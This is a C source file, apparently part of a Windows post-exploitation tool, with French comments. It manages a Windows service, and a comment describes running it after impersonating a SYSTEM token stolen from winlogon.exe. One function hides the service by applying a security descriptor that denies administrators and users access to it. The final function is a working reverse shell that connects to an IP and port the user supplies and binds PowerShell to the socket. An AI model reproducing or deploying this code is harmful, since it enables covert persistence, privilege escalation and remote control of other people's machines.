#include "svc.h"

/**
 * @brief Installe le service. Le handler est cree avec differente option necessaires
 * a la creation du service.
 * 
 * @param SCManager 
 */
VOID InstallSvc(SC_HANDLE SCManager)
{
    char cwd[MAX_PATH];
    GetCurrentDirectory((DWORD)MAX_PATH, (LPSTR)&cwd);
    size_t totalLenSvcBinPath = strlen(cwd) + (size_t)1 + strlen(SVC_BIN) + (size_t)1; 
    char *binaryPath = malloc(totalLenSvcBinPath);

    if (binaryPath == NULL)
    {
        CloseServiceHandle(SCManager);
        exit(PrintError());
    }
    strcpy_s(binaryPath, totalLenSvcBinPath, cwd);
    strcat_s(binaryPath, totalLenSvcBinPath, "\\");
    strcat_s(binaryPath, totalLenSvcBinPath, SVC_BIN);

    SC_HANDLE handlerSvc = CreateServiceA(SCManager,
    SVC_NAME,
    SVC_NAME,
    SC_MANAGER_ALL_ACCESS,
    SERVICE_WIN32_OWN_PROCESS,
    SERVICE_DEMAND_START,
    SERVICE_ERROR_IGNORE,
    binaryPath,
    NULL, NULL, NULL, NULL, "");
    if (handlerSvc == NULL)
    {
        CloseServiceHandle(SCManager);
        REEF(binaryPath);
        exit(PrintError());
    }
    CloseServiceHandle(SCManager);
    CloseServiceHandle(handlerSvc);
    REEF(binaryPath);
    printf("Service %s installed.\n", SVC_NAME);
}

/**
 * Demarre le service s'il n'est pas deja demarre. Auparavant, usurpe un token system en dupliquant le token de winlogon.exe (cf ImpersonateSystemToken()),
 * de telle facon a ce que le thread courant fonctionne avec les droits NT AUTHORITY/SYSTEM
 */

 // NE PAS OUBLIER DE CHECKER SI LE SERVICE EST UP AVANT DE VOULOIR LE DEMARRER.
VOID StartSvc(SC_HANDLE SCManager)
{
    SC_HANDLE handlerSvc = OpenService(SCManager, SVC_NAME, SERVICE_START);
    char choosenSessionStr[3];
    const char *av[] = {choosenSessionStr};
    if (handlerSvc == NULL)
    {
        CloseServiceHandle(SCManager);
        exit(PrintError());
    }
    DWORD choosenSession = ChooseSessionToLog();
    if (choosenSession == 0)
    {
        CloseServiceHandle(SCManager);
        CloseServiceHandle(handlerSvc);
        exit(PrintError());
    }
    _itoa_s(choosenSession, choosenSessionStr, _countof(choosenSessionStr) ,10);
    if (strlen(choosenSessionStr) == 0)
    {
        printf("Itoa failed.\n");
        CloseServiceHandle(SCManager);
        CloseServiceHandle(handlerSvc);
        exit(PrintError());
    }
    BOOL success = StartServiceA(handlerSvc, 1, av);
    if (!success)
    {
        CloseServiceHandle(SCManager);
        CloseServiceHandle(handlerSvc);
        exit(PrintError());
    }
    printf("Service %s started successfully.\n", SVC_NAME);
    CloseServiceHandle(SCManager);
    CloseServiceHandle(handlerSvc);
}

/**
 * Stoppe le service
 */
VOID StopSvc(SC_HANDLE SCManager)
{
    SC_HANDLE handlerSvc = OpenService(SCManager, SVC_NAME, SERVICE_STOP);
    SERVICE_STATUS_PROCESS stat;
    if (handlerSvc == NULL)
    {
        CloseServiceHandle(SCManager);
        exit(PrintError());
    }
    BOOL success = ControlService(handlerSvc, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&stat);
    if (!success)
    {
        CloseServiceHandle(SCManager);
        CloseServiceHandle(handlerSvc);
        exit(PrintError());
    }
    printf("Service %s stopped successfully.\n", SVC_NAME);
    CloseServiceHandle(SCManager);
    CloseServiceHandle(handlerSvc);
}

/**
 * Detruit le service
 */
VOID DeleteSvc(SC_HANDLE SCManager)
{
    SC_HANDLE handlerSvc = OpenService(SCManager, SVC_NAME, DELETE);
    if (handlerSvc == NULL)
    {
        CloseServiceHandle(SCManager);
        exit(PrintError());
    }
    BOOL success = DeleteService(handlerSvc);
    if (!success)
    {
        CloseServiceHandle(SCManager);
        CloseServiceHandle(handlerSvc);
        exit(PrintError());
    }
    printf("Service %s deleted successfully.\n", SVC_NAME);
    CloseServiceHandle(SCManager);
    CloseServiceHandle(handlerSvc);
}

VOID UpdateSvc(SC_HANDLE SCManager)
{
    SC_HANDLE handlerSvc = OpenService(SCManager, SVC_NAME, SERVICE_CHANGE_CONFIG);
    char displayName[4096];
    if (handlerSvc == NULL)
    {
        CloseServiceHandle(SCManager);
        exit(PrintError());
    }
    printf("Write the new display name for the service :\n");
    scanf_s("%100s", &displayName, (unsigned)_countof(displayName));
    printf("%s\n", displayName);
    BOOL success = ChangeServiceConfigA(handlerSvc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, displayName);
    if (success == FALSE) printf("Failed to update the service display name.\n");
    else printf("Service updated successfully.\n");
    CloseServiceHandle(SCManager);
    CloseServiceHandle(handlerSvc);
}

VOID HideSvc(SC_HANDLE SCManager)
{
    (void)SCManager;
    SC_HANDLE handlerSvc = OpenService(SCManager, SVC_NAME, WRITE_DAC);
    if (handlerSvc == NULL)
    {
        CloseServiceHandle(SCManager);
        exit(PrintError());
    }
    LPCSTR aceStr = "D:(D;;DCWPDTSD;;;IU)(D;;DCWPDTSD;;;SU)(D;;DCWPDTSD;;;BA)(A;;CCSWLOCRRC;;;IU)(A;;CCSWLOCRRC;;;SU)(A;;CCSWRPWPDTLOCRRC;;;SY)(A;;CCDCSWRPWPDTLOCRSDRCWDWO;;;BA)";
    PSECURITY_DESCRIPTOR secDesc;
    ULONG secDescsz = 0;
    BOOL success = ConvertStringSecurityDescriptorToSecurityDescriptorA(aceStr, SDDL_REVISION_1, &secDesc, &secDescsz);
    if (success == FALSE) exit(PrintError());
    success = SetServiceObjectSecurity(handlerSvc, DACL_SECURITY_INFORMATION, secDesc);
    if (success == FALSE)  exit(PrintError());
    else printf("Service updated successfully.\n");
    CloseServiceHandle(SCManager);
    CloseServiceHandle(handlerSvc);
}

VOID ShowSvc(SC_HANDLE SCManager)
{
    (void)SCManager;
    SC_HANDLE handlerSvc = OpenService(SCManager, SVC_NAME, WRITE_DAC);
    if (handlerSvc == NULL)
    {
        CloseServiceHandle(SCManager);
        exit(PrintError());
    }
    LPCSTR aceStr = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
    PSECURITY_DESCRIPTOR secDesc;
    ULONG secDescsz = 0;
    BOOL success = ConvertStringSecurityDescriptorToSecurityDescriptorA(aceStr, SDDL_REVISION_1, &secDesc, &secDescsz);
    if (success == FALSE) exit(PrintError());
    success = SetServiceObjectSecurity(handlerSvc, DACL_SECURITY_INFORMATION, secDesc);
    if (success == FALSE) exit(PrintError());
    else printf("Service updated successfully.\n");
    CloseServiceHandle(SCManager);
    CloseServiceHandle(handlerSvc);
}

//reverse shell
VOID Shell(void)
{
    WSADATA wsaData;
    SOCKET Winsock;
    struct sockaddr_in srv; 
    char ip_addr[17]; 
    char port[7];
    STARTUPINFO init_proc;
    PROCESS_INFORMATION processo_info;

    printf("Give the IPv4 address to connect to :\n");
    scanf_s("%16s", &ip_addr, (unsigned)_countof(ip_addr));
    printf("Choosen address : %s\n", ip_addr);
    printf("Give the port to connect to :\n");
    scanf_s("%6s", &port, (unsigned)_countof(port));
    printf("Choosen port : %s\n", ip_addr);
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    Winsock = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    srv.sin_family = AF_INET;
    srv.sin_port = htons((u_short)atoi(port));
    if (inet_pton(AF_INET, ip_addr, &srv.sin_addr.s_addr) != 1)
    {
        int res = WSAGetLastError();
        printf("inet_pton failed. Error code : %d\n", res);
        exit(1);
    }
    if (WSAConnect(Winsock, (SOCKADDR*)&srv, sizeof(srv), NULL, NULL, NULL, NULL) != 0)
    {
        int res = WSAGetLastError();
        printf("WSAConnect failed. Error code : %d\n", res);
        exit(1);
    }
    memset(&init_proc, 0, sizeof(init_proc));
    init_proc.cb = sizeof(init_proc);
    init_proc.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
    init_proc.hStdInput = init_proc.hStdOutput = init_proc.hStdError = (HANDLE)Winsock;
    CreateProcess(NULL, POWERSHELL_NAME, NULL, NULL, TRUE, 0, NULL, NULL, &init_proc, &processo_info);
}